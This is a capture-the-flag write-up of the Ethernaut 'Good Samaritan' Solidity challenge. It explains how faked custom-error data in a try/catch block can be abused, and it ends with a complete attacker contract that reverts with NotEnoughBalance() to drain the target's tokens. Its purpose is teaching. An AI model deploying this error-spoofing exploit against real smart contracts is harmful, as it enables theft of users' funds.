# Level 27 - Good Samaritan

- This challenge is about manipulating error return values.
- [Documentation about Custom Errors.](https://soliditylang.org/blog/2021/04/21/custom-errors/) It says that when a revert CustomError() is executed, it reverts with the signature of error. For example→ `revert Unauthorized();` returns error signature `0x82b42900`. If error returns from an external call, it is not trustable.
    
    > Please be careful when using error data since its origin is not tracked. The error data by default bubbles up through the chain of external calls, which means that a contract may forward an error not defined in any of the contracts it calls directly. Furthermore, any contract can fake any error by returning data that matches an error signature, even if the error is not defined anywhere.
    > 
- In our example, Wallet has millions of token and it only donates 10 tokens at once. It is not possible to pay its gas.
- There is also another function transferRemainder, which transfers all the tokens wallet hold, but it is protected with onlyOwner.
    - This function is called from requestDonation method of main contract (owner). But it is called only in `NotEnoughBalance()` error case.
    
    ```solidity
    function requestDonation() external returns (bool enoughBalance) {
            // donate 10 coins to requester
            try wallet.donate10(msg.sender) {
                return true;
            } catch (bytes memory err) {
                if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                    // send the coins left
                    wallet.transferRemainder(msg.sender);
                    return false;
                }
            }
        }
    ```
    
- We should also know about [try catch statements](https://docs.soliditylang.org/en/latest/control-structures.html#try-catch).
    
    > Solidity also supports exception handling in the form of `try`/`catch`-statements, but only for [external function calls](https://docs.soliditylang.org/en/latest/control-structures.html#external-function-calls) and contract creation calls. Errors can be created using the [revert statement](https://docs.soliditylang.org/en/latest/control-structures.html#revert-statement).
    > 
    - In an external call, if execution reverts, reverts back until try catch statement with a returned data. In our example, if `donate10(msg.sender)` fails for some reason, it will continue in catch block.
    - In this example, it is assumed that it reverts if balance is smaller than 10 and if error message/data/signature is equals to `NotEnoughBalance()`, it will send remainder amount.
- If we can force donate10 to revert with correct error message, we can drain all of the tokens.
    - In order to do that, we have to send donation request from a contract and revert somehow. We can’t use receive since it is not native token transfer. Instead there is a method named notify and it calls notify method if msg.sender is a contract.
    - We can implement notify and revert.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GoodSamaritan {
    function requestDonation() external;
}

contract SamaritanAttacker {
    GoodSamaritan samaritan;
    error NotEnoughBalance();

    constructor(address _goodSameritan) {
        samaritan = GoodSamaritan(_goodSameritan);
    }

    function attack() public {
        samaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```